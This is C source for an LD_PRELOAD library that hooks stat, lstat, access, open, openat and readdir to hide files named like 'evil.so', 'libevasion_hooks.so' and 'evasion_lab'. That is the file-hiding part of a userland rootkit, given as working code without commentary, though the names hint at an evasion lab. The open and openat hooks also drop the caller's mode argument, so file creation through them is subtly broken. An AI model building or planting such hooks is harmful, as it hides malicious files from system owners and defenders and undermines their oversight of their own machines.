#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/types.h>

#define HIDDEN_FILE     "evil.so"
#define HOOKS_FILENAME  "libevasion_hooks.so"
#define OPS_FILENAME    "evasion_lab"

static int is_hidden(const char *path) {
    if (!path) return 0;
    if (strstr(path, HIDDEN_FILE)) return 1;
    if (strstr(path, HOOKS_FILENAME)) return 1;
    if (strstr(path, "evasion_hooks.so")) return 1;
    if (strstr(path, OPS_FILENAME)) return 1;
    return 0;
}

/* __xstat */
int __xstat(int ver, const char *path, struct stat *buf) {
    static int (*orig)(int, const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "__xstat");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

/* __lxstat */
int __lxstat(int ver, const char *path, struct stat *buf) {
    static int (*orig)(int, const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "__lxstat");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

/* stat */
int stat(const char *path, struct stat *buf) {
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "stat");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(path, buf);
}

/* lstat */
int lstat(const char *path, struct stat *buf) {
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "lstat");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(path, buf);
}

/* access */
int access(const char *path, int mode) {
    static int (*orig)(const char *, int) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "access");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(path, mode);
}

/* open */
int open(const char *path, int flags, ...) {
    static int (*orig)(const char *, int, mode_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    return orig(path, flags, mode);
}

/* openat */
int openat(int dirfd, const char *path, int flags, ...) {
    static int (*orig)(int, const char *, int, mode_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "openat");
    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    return orig(dirfd, path, flags, mode);
}

/* readdir */
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}
